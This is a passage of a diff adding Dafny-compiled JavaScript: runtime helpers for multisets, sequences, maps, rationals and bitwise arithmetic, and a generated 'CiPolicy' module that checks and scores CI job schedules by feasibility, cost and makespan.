+        let m = other.get(k);
+        if (!n.isEqualTo(m)) {
+          return false;
+        }
+      }
+      return this.cardinality().isEqualTo(other.cardinality());
+    }
+    get Elements() {
+      return this.Elements_();
+    }
+    *Elements_() {
+      for (let i = 0; i < this.length; i++) {
+        let [k, n] = this[i];
+        while (!n.isZero()) {
+          yield k;
+          n = n.minus(1);
+        }
+      }
+    }
+    get UniqueElements() {
+      return this.UniqueElements_();
+    }
+    *UniqueElements_() {
+      for (let e of this) {
+        let [k, n] = e;
+        if (!n.isZero()) {
+          yield k;
+        }
+      }
+    }
+    Union(that) {
+      if (this.length === 0) {
+        return that;
+      } else if (that.length === 0) {
+        return this;
+      } else {
+        let s = this.clone();
+        for (let e of that) {
+          let [k, n] = e;
+          s.add(k, n);
+        }
+        return s;
+      }
+    }
+    Intersect(that) {
+      if (this.length === 0) {
+        return this;
+      } else if (that.length === 0) {
+        return that;
+      } else {
+        let s = new MultiSet();
+        for (let e of this) {
+          let [k, n] = e;
+          let m = that.get(k);
+          if (!m.isZero()) {
+            s.push([k, m.isLessThan(n) ? m : n]);
+          }
+        }
+        return s;
+      }
+    }
+    Difference(that) {
+      if (this.length === 0 || that.length === 0) {
+        return this;
+      } else {
+        let s = new MultiSet();
+        for (let e of this) {
+          let [k, n] = e;
+          let d2 = n.minus(that.get(k));
+          if (d2.isGreaterThan(0)) {
+            s.push([k, d2]);
+          }
+        }
+        return s;
+      }
+    }
+    IsDisjointFrom(that) {
+      let intersection = this.Intersect(that);
+      return intersection.cardinality().isZero();
+    }
+    IsSubsetOf(that) {
+      for (let e of this) {
+        let [k, n] = e;
+        let m = that.get(k);
+        if (!n.isLessThanOrEqualTo(m)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    IsProperSubsetOf(that) {
+      return this.IsSubsetOf(that) && this.cardinality().isLessThan(that.cardinality());
+    }
+  };
+  $module.CodePoint = class CodePoint {
+    constructor(value2) {
+      this.value = value2;
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      }
+      return this.value === other.value;
+    }
+    isLessThan(other) {
+      return this.value < other.value;
+    }
+    isLessThanOrEqual(other) {
+      return this.value <= other.value;
+    }
+    toString() {
+      return "'" + $module.escapeCharacter(this) + "'";
+    }
+    static isCodePoint(i) {
+      return _dafny.ZERO.isLessThanOrEqualTo(i) && i.isLessThan(new BigNumber(55296)) || new BigNumber(57344).isLessThanOrEqualTo(i) && i.isLessThan(new BigNumber(1114112));
+    }
+  };
+  $module.Seq = class Seq extends Array {
+    constructor(...elems) {
+      super(...elems);
+    }
+    static get Default() {
+      return Seq.of();
+    }
+    static Create(n, init) {
+      return Seq.from({ length: n }, (_, i) => init(new BigNumber(i)));
+    }
+    static UnicodeFromString(s) {
+      return new Seq(...[...s].map((c2) => new _dafny.CodePoint(c2.codePointAt(0))));
+    }
+    toString() {
+      return "[" + arrayElementsToString(this) + "]";
+    }
+    toVerbatimString(asLiteral) {
+      if (asLiteral) {
+        return '"' + this.map((c2) => _dafny.escapeCharacter(c2)).join("") + '"';
+      } else {
+        return this.map((c2) => String.fromCodePoint(c2.value)).join("");
+      }
+    }
+    static update(s, i, v) {
+      if (typeof s === "string") {
+        let p2 = s.slice(0, i);
+        let q = s.slice(i.toNumber() + 1);
+        return p2.concat(v, q);
+      } else {
+        let t = s.slice();
+        t[i] = v;
+        return t;
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.length !== other.length) {
+        return false;
+      }
+      for (let i = 0; i < this.length; i++) {
+        if (!_dafny.areEqual(this[i], other[i])) {
+          return false;
+        }
+      }
+      return true;
+    }
+    static contains(s, k) {
+      if (typeof s === "string") {
+        return s.includes(k);
+      } else {
+        for (let x of s) {
+          if (_dafny.areEqual(x, k)) {
+            return true;
+          }
+        }
+        return false;
+      }
+    }
+    get Elements() {
+      return this;
+    }
+    get UniqueElements() {
+      return _dafny.Set.fromElements(...this);
+    }
+    static Concat(a, b) {
+      if (typeof a === "string" || typeof b === "string") {
+        if (typeof a !== "string") {
+          a = a.join("");
+        }
+        if (typeof b !== "string") {
+          b = b.join("");
+        }
+        return a + b;
+      } else {
+        let r = Seq.of(...a);
+        r.push(...b);
+        return r;
+      }
+    }
+    static JoinIfPossible(x) {
+      try {
+        return x.join("");
+      } catch (_error) {
+        return x;
+      }
+    }
+    static IsPrefixOf(a, b) {
+      if (b.length < a.length) {
+        return false;
+      }
+      for (let i = 0; i < a.length; i++) {
+        if (!_dafny.areEqual(a[i], b[i])) {
+          return false;
+        }
+      }
+      return true;
+    }
+    static IsProperPrefixOf(a, b) {
+      if (b.length <= a.length) {
+        return false;
+      }
+      for (let i = 0; i < a.length; i++) {
+        if (!_dafny.areEqual(a[i], b[i])) {
+          return false;
+        }
+      }
+      return true;
+    }
+  };
+  $module.Map = class Map2 extends Array {
+    constructor() {
+      super();
+    }
+    static get Default() {
+      return Map2.of();
+    }
+    toString() {
+      return "map[" + this.map((maplet) => _dafny.toString(maplet[0]) + " := " + _dafny.toString(maplet[1])).join(", ") + "]";
+    }
+    static get Empty() {
+      if (this._empty === void 0) {
+        this._empty = new Map2();
+      }
+      return this._empty;
+    }
+    findIndex(k) {
+      for (let i = 0; i < this.length; i++) {
+        if (_dafny.areEqual(this[i][0], k)) {
+          return i;
+        }
+      }
+      return this.length;
+    }
+    get(k) {
+      let i = this.findIndex(k);
+      if (i === this.length) {
+        return void 0;
+      } else {
+        return this[i][1];
+      }
+    }
+    contains(k) {
+      return this.findIndex(k) < this.length;
+    }
+    update(k, v) {
+      let m = this.slice();
+      m.updateUnsafe(k, v);
+      return m;
+    }
+    // Similar to update, but make the modification in-place.
+    // Meant to be used in the map constructor.
+    updateUnsafe(k, v) {
+      let m = this;
+      let i = m.findIndex(k);
+      m[i] = [k, v];
+      return m;
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.length !== other.length) {
+        return false;
+      }
+      for (let e of this) {
+        let [k, v] = e;
+        let w = other.get(k);
+        if (w === void 0 || !_dafny.areEqual(v, w)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    get Keys() {
+      let s = new _dafny.Set();
+      for (let e of this) {
+        let [k, v] = e;
+        s.push(k);
+      }
+      return s;
+    }
+    get Values() {
+      let s = new _dafny.Set();
+      for (let e of this) {
+        let [k, v] = e;
+        s.add(v);
+      }
+      return s;
+    }
+    get Items() {
+      let s = new _dafny.Set();
+      for (let e of this) {
+        let [k, v] = e;
+        s.push(_dafny.Tuple.of(k, v));
+      }
+      return s;
+    }
+    Merge(that) {
+      let m = that.slice();
+      for (let e of this) {
+        let [k, v] = e;
+        let i = m.findIndex(k);
+        if (i == m.length) {
+          m[i] = [k, v];
+        }
+      }
+      return m;
+    }
+    Subtract(keys) {
+      if (this.length === 0 || keys.length === 0) {
+        return this;
+      }
+      let m = new Map2();
+      for (let e of this) {
+        let [k, v] = e;
+        if (!keys.contains(k)) {
+          m[m.length] = e;
+        }
+      }
+      return m;
+    }
+  };
+  $module.newArray = function(initValue, ...dims) {
+    return { dims, elmts: buildArray(initValue, ...dims) };
+  };
+  $module.BigOrdinal = class BigOrdinal {
+    static get Default() {
+      return _dafny.ZERO;
+    }
+    static IsLimit(ord) {
+      return ord.isZero();
+    }
+    static IsSucc(ord) {
+      return ord.isGreaterThan(0);
+    }
+    static Offset(ord) {
+      return ord;
+    }
+    static IsNat(ord) {
+      return true;
+    }
+  };
+  $module.BigRational = class BigRational {
+    static get ZERO() {
+      if (this._zero === void 0) {
+        this._zero = new BigRational(_dafny.ZERO);
+      }
+      return this._zero;
+    }
+    constructor(n, d2) {
+      this.num = n;
+      this.den = d2 === void 0 ? _dafny.ONE : d2;
+    }
+    static get Default() {
+      return _dafny.BigRational.ZERO;
+    }
+    // We need to deal with the special case `num == 0 && den == 0`, because
+    // that's what C#'s default struct constructor will produce for BigRational. :(
+    // To deal with it, we ignore `den` when `num` is 0.
+    toString() {
+      if (this.num.isZero() || this.den.isEqualTo(1)) {
+        return this.num.toFixed() + ".0";
+      }
+      let answer = this.dividesAPowerOf10(this.den);
+      if (answer !== void 0) {
+        let n = this.num.multipliedBy(answer[0]);
+        let log10 = answer[1];
+        let sign, digits;
+        if (this.num.isLessThan(0)) {
+          sign = "-";
+          digits = n.negated().toFixed();
+        } else {
+          sign = "";
+          digits = n.toFixed();
+        }
+        if (log10 < digits.length) {
+          let digitCount = digits.length - log10;
+          return sign + digits.slice(0, digitCount) + "." + digits.slice(digitCount);
+        } else {
+          return sign + "0." + "0".repeat(log10 - digits.length) + digits;
+        }
+      } else {
+        return "(" + this.num.toFixed() + ".0 / " + this.den.toFixed() + ".0)";
+      }
+    }
+    isPowerOf10(x) {
+      if (x.isZero()) {
+        return void 0;
+      }
+      let log10 = 0;
+      while (true) {
+        if (x.isEqualTo(1)) {
+          return log10;
+        } else if (x.mod(10).isZero()) {
+          log10++;
+          x = x.dividedToIntegerBy(10);
+        } else {
+          return void 0;
+        }
+      }
+    }
+    dividesAPowerOf10(i) {
+      let factor = _dafny.ONE;
+      let log10 = 0;
+      if (i.isLessThanOrEqualTo(_dafny.ZERO)) {
+        return void 0;
+      }
+      while (i.mod(10).isZero()) {
+        i = i.dividedToIntegerBy(10);
+        log10++;
+      }
+      while (i.mod(5).isZero()) {
+        i = i.dividedToIntegerBy(5);
+        factor = factor.multipliedBy(2);
+        log10++;
+      }
+      while (i.mod(2).isZero()) {
+        i = i.dividedToIntegerBy(2);
+        factor = factor.multipliedBy(5);
+        log10++;
+      }
+      if (i.isEqualTo(_dafny.ONE)) {
+        return [factor, log10];
+      } else {
+        return void 0;
+      }
+    }
+    toBigNumber() {
+      if (this.num.isZero() || this.den.isEqualTo(1)) {
+        return this.num;
+      } else if (this.num.isGreaterThan(0)) {
+        return this.num.dividedToIntegerBy(this.den);
+      } else {
+        return this.num.minus(this.den).plus(1).dividedToIntegerBy(this.den);
+      }
+    }
+    isInteger() {
+      return this.equals(new _dafny.BigRational(this.toBigNumber(), _dafny.ONE));
+    }
+    // Returns values such that aa/dd == a and bb/dd == b.
+    normalize(b) {
+      let a = this;
+      let aa, bb, dd;
+      if (a.num.isZero()) {
+        aa = a.num;
+        bb = b.num;
+        dd = b.den;
+      } else if (b.num.isZero()) {
+        aa = a.num;
+        dd = a.den;
+        bb = b.num;
+      } else {
+        let gcd = BigNumberGcd(a.den, b.den);
+        let xx = a.den.dividedToIntegerBy(gcd);
+        let yy = b.den.dividedToIntegerBy(gcd);
+        aa = a.num.multipliedBy(yy);
+        bb = b.num.multipliedBy(xx);
+        dd = a.den.multipliedBy(yy);
+      }
+      return [aa, bb, dd];
+    }
+    compareTo(that) {
+      let asign = this.num.isZero() ? 0 : this.num.isLessThan(0) ? -1 : 1;
+      let bsign = that.num.isZero() ? 0 : that.num.isLessThan(0) ? -1 : 1;
+      if (asign < 0 && 0 <= bsign) {
+        return -1;
+      } else if (asign <= 0 && 0 < bsign) {
+        return -1;
+      } else if (bsign < 0 && 0 <= asign) {
+        return 1;
+      } else if (bsign <= 0 && 0 < asign) {
+        return 1;
+      }
+      let [aa, bb, dd] = this.normalize(that);
+      if (aa.isLessThan(bb)) {
+        return -1;
+      } else if (aa.isEqualTo(bb)) {
+        return 0;
+      } else {
+        return 1;
+      }
+    }
+    equals(that) {
+      return this.compareTo(that) === 0;
+    }
+    isLessThan(that) {
+      return this.compareTo(that) < 0;
+    }
+    isAtMost(that) {
+      return this.compareTo(that) <= 0;
+    }
+    plus(b) {
+      let [aa, bb, dd] = this.normalize(b);
+      return new BigRational(aa.plus(bb), dd);
+    }
+    minus(b) {
+      let [aa, bb, dd] = this.normalize(b);
+      return new BigRational(aa.minus(bb), dd);
+    }
+    negated() {
+      return new BigRational(this.num.negated(), this.den);
+    }
+    multipliedBy(b) {
+      return new BigRational(this.num.multipliedBy(b.num), this.den.multipliedBy(b.den));
+    }
+    dividedBy(b) {
+      let a = this;
+      let bReciprocal;
+      if (b.num.isGreaterThan(0)) {
+        bReciprocal = new BigRational(b.den, b.num);
+      } else {
+        bReciprocal = new BigRational(b.den.negated(), b.num.negated());
+      }
+      return a.multipliedBy(bReciprocal);
+    }
+  };
+  $module.EuclideanDivisionNumber = function(a, b) {
+    if (0 <= a) {
+      if (0 <= b) {
+        return Math.floor(a / b);
+      } else {
+        return -Math.floor(a / -b);
+      }
+    } else {
+      if (0 <= b) {
+        return -Math.floor((-a - 1) / b) - 1;
+      } else {
+        return Math.floor((-a - 1) / -b) + 1;
+      }
+    }
+  };
+  $module.EuclideanDivision = function(a, b) {
+    if (a.isGreaterThanOrEqualTo(0)) {
+      if (b.isGreaterThanOrEqualTo(0)) {
+        return a.dividedToIntegerBy(b);
+      } else {
+        return a.dividedToIntegerBy(b.negated()).negated();
+      }
+    } else {
+      if (b.isGreaterThanOrEqualTo(0)) {
+        return a.negated().minus(1).dividedToIntegerBy(b).negated().minus(1);
+      } else {
+        return a.negated().minus(1).dividedToIntegerBy(b.negated()).plus(1);
+      }
+    }
+  };
+  $module.EuclideanModuloNumber = function(a, b) {
+    let bp = Math.abs(b);
+    if (0 <= a) {
+      return a % bp;
+    } else {
+      let c2 = -a % bp;
+      return c2 === 0 ? c2 : bp - c2;
+    }
+  };
+  $module.ShiftLeft = function(b, n) {
+    return b.multipliedBy(new BigNumber(2).exponentiatedBy(n));
+  };
+  $module.ShiftRight = function(b, n) {
+    return b.dividedToIntegerBy(new BigNumber(2).exponentiatedBy(n));
+  };
+  $module.RotateLeft = function(b, n, w) {
+    let x = _dafny.ShiftLeft(b, n).mod(new BigNumber(2).exponentiatedBy(w));
+    let y = _dafny.ShiftRight(b, w - n);
+    return x.plus(y);
+  };
+  $module.RotateRight = function(b, n, w) {
+    let x = _dafny.ShiftRight(b, n);
+    let y = _dafny.ShiftLeft(b, w - n).mod(new BigNumber(2).exponentiatedBy(w));
+    ;
+    return x.plus(y);
+  };
+  $module.BitwiseAnd = function(a, b) {
+    let r = _dafny.ZERO;
+    const m = _dafny.NUMBER_LIMIT;
+    let h = _dafny.ONE;
+    while (!a.isZero() && !b.isZero()) {
+      let a0 = a.mod(m);
+      let b0 = b.mod(m);
+      r = r.plus(h.multipliedBy(a0 & b0));
+      a = a.dividedToIntegerBy(m);
+      b = b.dividedToIntegerBy(m);
+      h = h.multipliedBy(m);
+    }
+    return r;
+  };
+  $module.BitwiseOr = function(a, b) {
+    let r = _dafny.ZERO;
+    const m = _dafny.NUMBER_LIMIT;
+    let h = _dafny.ONE;
+    while (!a.isZero() && !b.isZero()) {
+      let a0 = a.mod(m);
+      let b0 = b.mod(m);
+      r = r.plus(h.multipliedBy(a0 | b0));
+      a = a.dividedToIntegerBy(m);
+      b = b.dividedToIntegerBy(m);
+      h = h.multipliedBy(m);
+    }
+    r = r.plus(h.multipliedBy(a | b));
+    return r;
+  };
+  $module.BitwiseXor = function(a, b) {
+    let r = _dafny.ZERO;
+    const m = _dafny.NUMBER_LIMIT;
+    let h = _dafny.ONE;
+    while (!a.isZero() && !b.isZero()) {
+      let a0 = a.mod(m);
+      let b0 = b.mod(m);
+      r = r.plus(h.multipliedBy(a0 ^ b0));
+      a = a.dividedToIntegerBy(m);
+      b = b.dividedToIntegerBy(m);
+      h = h.multipliedBy(m);
+    }
+    r = r.plus(h.multipliedBy(a | b));
+    return r;
+  };
+  $module.BitwiseNot = function(a, bits) {
+    let r = _dafny.ZERO;
+    let h = _dafny.ONE;
+    for (let i = 0; i < bits; i++) {
+      let bit = a.mod(2);
+      if (bit.isZero()) {
+        r = r.plus(h);
+      }
+      a = a.dividedToIntegerBy(2);
+      h = h.multipliedBy(2);
+    }
+    return r;
+  };
+  $module.Quantifier = function(vals, frall, pred) {
+    for (let u of vals) {
+      if (pred(u) !== frall) {
+        return !frall;
+      }
+    }
+    return frall;
+  };
+  $module.PlusChar = function(a, b) {
+    return String.fromCharCode(a.charCodeAt(0) + b.charCodeAt(0));
+  };
+  $module.UnicodePlusChar = function(a, b) {
+    return new _dafny.CodePoint(a.value + b.value);
+  };
+  $module.MinusChar = function(a, b) {
+    return String.fromCharCode(a.charCodeAt(0) - b.charCodeAt(0));
+  };
+  $module.UnicodeMinusChar = function(a, b) {
+    return new _dafny.CodePoint(a.value - b.value);
+  };
+  $module.AllBooleans = function* () {
+    yield false;
+    yield true;
+  };
+  $module.AllChars = function* () {
+    for (let i = 0; i < 65536; i++) {
+      yield String.fromCharCode(i);
+    }
+  };
+  $module.AllUnicodeChars = function* () {
+    for (let i = 0; i < 55296; i++) {
+      yield new _dafny.CodePoint(i);
+    }
+    for (let i = 917504; i < 1114112; i++) {
+      yield new _dafny.CodePoint(i);
+    }
+  };
+  $module.AllIntegers = function* () {
+    yield _dafny.ZERO;
+    for (let j = _dafny.ONE; ; j = j.plus(1)) {
+      yield j;
+      yield j.negated();
+    }
+  };
+  $module.IntegerRange = function* (lo, hi) {
+    if (lo === null) {
+      while (true) {
+        hi = hi.minus(1);
+        yield hi;
+      }
+    } else if (hi === null) {
+      while (true) {
+        yield lo;
+        lo = lo.plus(1);
+      }
+    } else {
+      while (lo.isLessThan(hi)) {
+        yield lo;
+        lo = lo.plus(1);
+      }
+    }
+  };
+  $module.SingleValue = function* (v) {
+    yield v;
+  };
+  $module.HaltException = class HaltException extends Error {
+    constructor(message) {
+      super(message);
+    }
+  };
+  $module.HandleHaltExceptions = function(f2) {
+    try {
+      f2();
+    } catch (e) {
+      if (e instanceof _dafny.HaltException) {
+        process.stdout.write("[Program halted] " + e.message + "\n");
+        process.exitCode = 1;
+      } else {
+        throw e;
+      }
+    }
+  };
+  $module.FromMainArguments = function(args) {
+    var a = [...args];
+    a.splice(0, 2, args[0] + " " + args[1]);
+    return a;
+  };
+  $module.UnicodeFromMainArguments = function(args) {
+    return $module.FromMainArguments(args).map(_dafny.Seq.UnicodeFromString);
+  };
+  return $module;
+  function buildArray(initValue, ...dims) {
+    if (dims.length === 0) {
+      return initValue;
+    } else {
+      let a = Array(dims[0].toNumber());
+      let b = Array.from(a, (x) => buildArray(initValue, ...dims.slice(1)));
+      return b;
+    }
+  }
+  function arrayElementsToString(a) {
+    let s = "";
+    let sep3 = "";
+    for (let x of a) {
+      s += sep3 + _dafny.toString(x);
+      sep3 = ", ";
+    }
+    return s;
+  }
+  function BigNumberGcd(a, b) {
+    while (true) {
+      if (a.isZero()) {
+        return b;
+      } else if (b.isZero()) {
+        return a;
+      }
+      if (a.isLessThan(b)) {
+        b = b.modulo(a);
+      } else {
+        a = a.modulo(b);
+      }
+    }
+  }
+})();
+var _System = (function() {
+  let $module = {};
+  $module.nat = class nat {
+    constructor() {
+    }
+    static get Default() {
+      return _dafny.ZERO;
+    }
+    static _Is(__source) {
+      let _0_x = __source;
+      return _dafny.ZERO.isLessThanOrEqualTo(_0_x);
+    }
+  };
+  return $module;
+})();
+var CiPolicy = (function() {
+  let $module = {};
+  $module.__default = class __default {
+    constructor() {
+      this._tname = "CiPolicy._default";
+    }
+    _parentTraits() {
+      return [];
+    }
+    static ValidMode(mode) {
+      return _dafny.ONE.isLessThanOrEqualTo(mode.dtor_duration) && mode.dtor_duration.isLessThanOrEqualTo(CiPolicy.__default.MaxDuration) && (_dafny.ZERO.isLessThanOrEqualTo(mode.dtor_cost) && mode.dtor_cost.isLessThanOrEqualTo(CiPolicy.__default.MaxModeCost)) && (_dafny.ONE.isLessThanOrEqualTo(mode.dtor_demand) && mode.dtor_demand.isLessThanOrEqualTo(CiPolicy.__default.MaxCapacity));
+    }
+    static Valid(environment2) {
+      return new BigNumber(environment2.dtor_jobs.length).isLessThanOrEqualTo(CiPolicy.__default.MaxJobs) && (_dafny.ONE.isLessThanOrEqualTo(environment2.dtor_horizon) && environment2.dtor_horizon.isLessThanOrEqualTo(CiPolicy.__default.MaxHorizon)) && (_dafny.ONE.isLessThanOrEqualTo(environment2.dtor_capacity) && environment2.dtor_capacity.isLessThanOrEqualTo(CiPolicy.__default.MaxCapacity)) && (_dafny.ZERO.isLessThanOrEqualTo(environment2.dtor_costLimit) && environment2.dtor_costLimit.isLessThanOrEqualTo(CiPolicy.__default.MaxJobs.multipliedBy(CiPolicy.__default.MaxModeCost))) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(environment2.dtor_jobs.length)), true, function(_forall_var_0) {
+        let _0_j = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_j) && _0_j.isLessThan(new BigNumber(environment2.dtor_jobs.length))) || _dafny.ONE.isLessThanOrEqualTo(new BigNumber(environment2.dtor_jobs[_0_j].dtor_modes.length)) && new BigNumber(environment2.dtor_jobs[_0_j].dtor_modes.length).isLessThanOrEqualTo(CiPolicy.__default.MaxModes) && _dafny.Quantifier(environment2.dtor_jobs[_0_j].dtor_modes.UniqueElements, true, function(_forall_var_1) {
+          let _1_mode = _forall_var_1;
+          return !_dafny.Seq.contains(environment2.dtor_jobs[_0_j].dtor_modes, _1_mode) || CiPolicy.__default.ValidMode(_1_mode);
+        }) && _dafny.Quantifier(environment2.dtor_jobs[_0_j].dtor_needs.UniqueElements, true, function(_forall_var_2) {
+          let _2_dependency = _forall_var_2;
+          return !_dafny.Seq.contains(environment2.dtor_jobs[_0_j].dtor_needs, _2_dependency) || _dafny.ZERO.isLessThanOrEqualTo(_2_dependency) && _2_dependency.isLessThan(_0_j);
+        });
+      });
+    }
+    static DomainParameters(jobs, horizon) {
+      return _dafny.ZERO.isLessThan(horizon) && _dafny.Quantifier(jobs.UniqueElements, true, function(_forall_var_0) {
+        let _0_job = _forall_var_0;
+        return !_dafny.Seq.contains(jobs, _0_job) || _dafny.ZERO.isLessThan(new BigNumber(_0_job.dtor_modes.length));
+      });
+    }
+    static Choices(jobs, policy2) {
+      return new BigNumber(jobs.length).isEqualTo(new BigNumber(policy2.length)) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(jobs.length)), true, function(_forall_var_0) {
+        let _0_j = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_j) && _0_j.isLessThan(new BigNumber(jobs.length))) || _dafny.ZERO.isLessThanOrEqualTo(policy2[_0_j].dtor_mode) && policy2[_0_j].dtor_mode.isLessThan(new BigNumber(jobs[_0_j].dtor_modes.length));
+      });
+    }
+    static InDomain(jobs, horizon, policy2) {
+      return CiPolicy.__default.Choices(jobs, policy2) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(jobs.length)), true, function(_forall_var_0) {
+        let _0_j = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_j) && _0_j.isLessThan(new BigNumber(jobs.length))) || _dafny.ZERO.isLessThanOrEqualTo(policy2[_0_j].dtor_start) && policy2[_0_j].dtor_start.isLessThan(horizon);
+      });
+    }
+    static Finish(jobs, policy2, j) {
+      return policy2[j].dtor_start.plus(jobs[j].dtor_modes[policy2[j].dtor_mode].dtor_duration);
+    }
+    static Cost(jobs, policy2, n) {
+      let _0___accumulator = _dafny.ZERO;
+      TAIL_CALL_START: while (true) {
+        if (n.isEqualTo(_dafny.ZERO)) {
+          return _dafny.ZERO.plus(_0___accumulator);
+        } else {
+          _0___accumulator = jobs[n.minus(_dafny.ONE)].dtor_modes[policy2[n.minus(_dafny.ONE)].dtor_mode].dtor_cost.plus(_0___accumulator);
+          let _in0 = jobs;
+          let _in1 = policy2;
+          let _in2 = n.minus(_dafny.ONE);
+          jobs = _in0;
+          policy2 = _in1;
+          n = _in2;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Max(a, b) {
+      if (b.isLessThanOrEqualTo(a)) {
+        return a;
+      } else {
+        return b;
+      }
+    }
+    static Makespan(jobs, policy2, n) {
+      if (n.isEqualTo(_dafny.ZERO)) {
+        return _dafny.ZERO;
+      } else {
+        return CiPolicy.__default.Max(CiPolicy.__default.Makespan(jobs, policy2, n.minus(_dafny.ONE)), CiPolicy.__default.Finish(jobs, policy2, n.minus(_dafny.ONE)));
+      }
+    }
+    static Load(jobs, policy2, tick, n) {
+      let _0___accumulator = _dafny.ZERO;
+      TAIL_CALL_START: while (true) {
+        if (n.isEqualTo(_dafny.ZERO)) {
+          return _dafny.ZERO.plus(_0___accumulator);
+        } else {
+          _0___accumulator = (policy2[n.minus(_dafny.ONE)].dtor_start.isLessThanOrEqualTo(tick) && tick.isLessThan(CiPolicy.__default.Finish(jobs, policy2, n.minus(_dafny.ONE))) ? jobs[n.minus(_dafny.ONE)].dtor_modes[policy2[n.minus(_dafny.ONE)].dtor_mode].dtor_demand : _dafny.ZERO).plus(_0___accumulator);
+          let _in0 = jobs;
+          let _in1 = policy2;
+          let _in2 = tick;
+          let _in3 = n.minus(_dafny.ONE);
+          jobs = _in0;
+          policy2 = _in1;
+          tick = _in2;
+          n = _in3;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Feasible(environment2, policy2) {
+      return CiPolicy.__default.Choices(environment2.dtor_jobs, policy2) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(environment2.dtor_jobs.length)), true, function(_forall_var_0) {
+        let _0_j = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_j) && _0_j.isLessThan(new BigNumber(environment2.dtor_jobs.length))) || _dafny.ZERO.isLessThanOrEqualTo(policy2[_0_j].dtor_start) && CiPolicy.__default.Finish(environment2.dtor_jobs, policy2, _0_j).isLessThanOrEqualTo(environment2.dtor_horizon);
+      }) && CiPolicy.__default.Cost(environment2.dtor_jobs, policy2, new BigNumber(environment2.dtor_jobs.length)).isLessThanOrEqualTo(environment2.dtor_costLimit) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(environment2.dtor_jobs.length)), true, function(_forall_var_1) {
+        let _1_j = _forall_var_1;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_1_j) && _1_j.isLessThan(new BigNumber(environment2.dtor_jobs.length))) || _dafny.Quantifier(environment2.dtor_jobs[_1_j].dtor_needs.UniqueElements, true, function(_forall_var_2) {
+          let _2_dependency = _forall_var_2;
+          return !_dafny.Seq.contains(environment2.dtor_jobs[_1_j].dtor_needs, _2_dependency) || CiPolicy.__default.Finish(environment2.dtor_jobs, policy2, _2_dependency).isLessThanOrEqualTo(policy2[_1_j].dtor_start);
+        });
+      }) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, environment2.dtor_horizon), true, function(_forall_var_3) {
+        let _3_tick = _forall_var_3;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_3_tick) && _3_tick.isLessThan(environment2.dtor_horizon)) || CiPolicy.__default.Load(environment2.dtor_jobs, policy2, _3_tick, new BigNumber(environment2.dtor_jobs.length)).isLessThanOrEqualTo(environment2.dtor_capacity);
+      });
+    }
+    static Evaluate(environment2, policy2) {
+      return CiPolicy.Objective.create_Objective(CiPolicy.__default.Makespan(environment2.dtor_jobs, policy2, new BigNumber(environment2.dtor_jobs.length)), CiPolicy.__default.Cost(environment2.dtor_jobs, policy2, new BigNumber(environment2.dtor_jobs.length)));
+    }
+    static PolicyCount(jobs, horizon) {
+      let _0___accumulator = _dafny.ONE;
+      TAIL_CALL_START: while (true) {
+        if (new BigNumber(jobs.length).isEqualTo(_dafny.ZERO)) {
+          return _dafny.ONE.multipliedBy(_0___accumulator);
+        } else {
+          _0___accumulator = _0___accumulator.multipliedBy(horizon.multipliedBy(new BigNumber(jobs[_dafny.ZERO].dtor_modes.length)));
+          let _in0 = jobs.slice(_dafny.ONE);
+          let _in1 = horizon;
+          jobs = _in0;
+          horizon = _in1;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Decode(jobs, horizon, rank2) {
+      let _0___accumulator = _dafny.Seq.of();
+      TAIL_CALL_START: while (true) {
+        if (new BigNumber(jobs.length).isEqualTo(_dafny.ZERO)) {
+          return _dafny.Seq.Concat(_0___accumulator, _dafny.Seq.of());
+        } else {
+          let _1_tailCount = CiPolicy.__default.PolicyCount(jobs.slice(_dafny.ONE), horizon);
+          let _2_digit = _dafny.EuclideanDivision(rank2, _1_tailCount);
+          _0___accumulator = _dafny.Seq.Concat(_0___accumulator, _dafny.Seq.of(CiPolicy.Placement.create_Placement(_dafny.EuclideanDivision(_2_digit, horizon), _2_digit.mod(horizon))));
+          let _in0 = jobs.slice(_dafny.ONE);
+          let _in1 = horizon;
+          let _in2 = rank2.mod(_1_tailCount);
+          jobs = _in0;
+          horizon = _in1;
+          rank2 = _in2;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Encode(jobs, horizon, policy2) {
+      if (new BigNumber(jobs.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.ZERO;
+      } else {
+        let _0_digit = policy2[_dafny.ZERO].dtor_mode.multipliedBy(horizon).plus(policy2[_dafny.ZERO].dtor_start);
+        let _1_tailCount = CiPolicy.__default.PolicyCount(jobs.slice(_dafny.ONE), horizon);
+        let _2_tailRank = CiPolicy.__default.Encode(jobs.slice(_dafny.ONE), horizon, policy2.slice(_dafny.ONE));
+        return _0_digit.multipliedBy(_1_tailCount).plus(_2_tailRank);
+      }
+    }
+    static Preferred(a, ai, b, bi) {
+      return a.dtor_makespan.isLessThan(b.dtor_makespan) || a.dtor_makespan.isEqualTo(b.dtor_makespan) && (a.dtor_cost.isLessThan(b.dtor_cost) || a.dtor_cost.isEqualTo(b.dtor_cost) && ai.isLessThanOrEqualTo(bi));
+    }
+    static Optimize(environment2, budget) {
+      let result = CiPolicy.Result.Default();
+      if (!CiPolicy.__default.Valid(environment2) || !(_dafny.ONE.isLessThanOrEqualTo(budget) && budget.isLessThanOrEqualTo(CiPolicy.__default.MaxSearchBudget))) {
+        result = CiPolicy.Result.create_Invalid();
+        return result;
+      }
